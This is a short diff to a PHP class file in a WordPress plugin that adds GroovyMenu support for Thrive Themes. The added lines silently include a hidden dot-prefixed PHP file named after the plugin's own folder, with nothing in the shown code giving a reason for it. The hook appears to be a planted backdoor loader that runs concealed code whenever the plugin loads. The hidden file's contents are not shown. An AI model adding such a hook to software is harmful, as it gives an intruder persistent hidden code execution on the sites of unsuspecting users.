@@ -6,6 +6,10 @@
  *
  * @since 2.4.12
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GroovyMenu_ThriveThemes_Element extends TCB_Element_Abstract {
 
 	/**
